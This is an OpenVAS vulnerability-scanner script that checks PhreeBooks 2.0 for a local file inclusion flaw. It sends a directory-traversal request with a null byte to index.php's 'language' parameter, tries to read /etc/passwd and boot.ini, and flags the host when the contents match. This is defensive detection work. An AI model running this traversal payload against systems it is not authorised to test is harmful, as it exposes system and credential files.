###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_PhreeBooks_40639.nasl 8510 2018-01-24 07:57:42Z teissa $
#
# PhreeBooks Multiple HTML-Injection and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "PhreeBooks is prone to multiple local file-include vulnerabilities and
multiple HTML-injection vulnerabilities because it fails to properly
sanitize user-supplied input.

An attacker can exploit the local file-include vulnerabilities using
directory-traversal strings to view files and execute local scripts in
the context of the webserver process; other attacks are also possible.

The attacker may leverage the HTML-injection issues to execute
arbitrary script code in the browser of an unsuspecting user in the
context of the affected site. This may let the attacker steal cookie-
based authentication credentials and launch other attacks.

PhreeBooks 2.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100670");
 script_version("$Revision: 8510 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-24 08:57:42 +0100 (Wed, 24 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-06-10 10:47:44 +0200 (Thu, 10 Jun 2010)");
 script_bugtraq_id(40639);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_name("PhreeBooks Multiple HTML-Injection and Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/40639");
 script_xref(name : "URL" , value : "http://www.phreebooks.com/");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/phreebooks/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_PhreeBooks_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"PhreeBooks"))exit(0);
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach file (keys(files)) {

  url = string(dir,"/index.php?language=../../../../../../../../../../../../../../../../../../../../",files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
